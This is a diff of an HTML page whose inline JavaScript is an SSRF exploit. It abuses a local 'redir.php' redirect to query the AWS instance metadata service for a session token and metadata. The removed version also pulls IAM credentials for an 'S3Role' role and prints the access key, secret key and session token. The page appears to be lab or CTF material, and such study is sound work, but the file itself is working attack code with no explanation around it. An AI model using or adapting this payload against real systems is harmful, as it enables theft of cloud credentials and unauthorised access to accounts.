@@ -1,94 +1,26 @@
-<!-- index.html -->
 <html>
-  <body>
-    <style>
-      h4 {
-        width: 1000px;
-        word-wrap: break-word;
-        overflow-wrap: break-word;
-      }
-    </style>
+    <h1>hello there</h1>
+    <div id="tokenResponse"></div>
+    <div id="metadataResponse"></div>
+    <div id="error"></div>
+    <script>
+        var tokenRequestUrl  = "http://localhost/redir.php?url=http://169.254.169.254/latest/api/token";
+        var metadataRequestUrl = "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/";
+        var httpRequest  = new XMLHttpRequest();
+        var metadataToken = '';
+        try {
+            httpRequest.open('PUT', tokenRequestUrl, false);
+            httpRequest.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
+            httpRequest.send();
+            metadataToken = httpRequest.responseText;
+            document.getElementById("tokenResponse").innerHTML = "Token: " + metadataToken;
 
-    <h4 id="token">Token</h4>
-    <br />
-    <h4 id="dirs">Dirs</h4>
-    <br />
-    <h4 id="credentials">Credentials</h4>
-
-    <script type="text/javascript">
-      let token = "";
-      let s3role = {};
-
-      // Step 1: Get token
-      const tokenRequest = new XMLHttpRequest();
-      tokenRequest.open(
-        "PUT",
-        "http://localhost/redir.php?url=http://169.254.169.254/latest/api/token",
-        false
-      );
-      tokenRequest.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds", "21600");
-      try {
-        tokenRequest.send();
-        if (tokenRequest.status === 200) {
-          token = tokenRequest.responseText;
-          document.getElementById("token").innerText = "Token: " + token;
-        } else {
-          document.getElementById("token").innerText = "Token fetch failed";
+            httpRequest.open('GET', metadataRequestUrl, false);
+            httpRequest.setRequestHeader('X-aws-ec2-metadata-token', metadataToken);
+            httpRequest.send();
+            document.getElementById("metadataResponse").innerHTML = httpRequest.responseText;
+        } catch(error) {
+            document.getElementById('error').innerHTML = error.message;
         }
-      } catch (e) {
-        document.getElementById("token").innerText = "Error: " + e.message;
-      }
-
-      // Step 2: Get meta-data
-      const metaRequest = new XMLHttpRequest();
-      metaRequest.open(
-        "GET",
-        "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/",
-        false
-      );
-      metaRequest.setRequestHeader("X-aws-ec2-metadata-token", token);
-      try {
-        metaRequest.send();
-        if (metaRequest.status === 200) {
-          document.getElementById("dirs").innerText = "Dirs:\n" + metaRequest.responseText;
-        } else {
-          document.getElementById("dirs").innerText = "Failed to fetch dirs";
-        }
-      } catch (e) {
-        document.getElementById("dirs").innerText = "Error: " + e.message;
-      }
-
-      // Step 3: Get credentials
-      const credsRequest = new XMLHttpRequest();
-      credsRequest.open(
-        "GET",
-        "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role",
-        false
-      );
-      credsRequest.setRequestHeader("X-aws-ec2-metadata-token", token);
-      try {
-        credsRequest.send();
-        if (credsRequest.status === 200) {
-          document.getElementById("credentials").innerText =
-            "Credentials:\n" + credsRequest.responseText;
-          s3role = JSON.parse(credsRequest.responseText);
-        } else {
-          document.getElementById("credentials").innerText = "Failed to fetch credentials";
-        }
-      } catch (e) {
-        document.getElementById("credentials").innerText = "Error: " + e.message;
-      }
-
-      // Optional: use credentials
-      if (s3role && s3role.Token) {
-        const accessToken = s3role.Token;
-        const secretKey = s3role.SecretAccessKey;
-        const accessKeyId = s3role.AccessKeyId;
-
-        console.log("Access Key ID:", accessKeyId);
-        console.log("Secret Access Key:", secretKey);
-        console.log("Session Token:", accessToken);
-      }
     </script>
-  </body>
 </html>
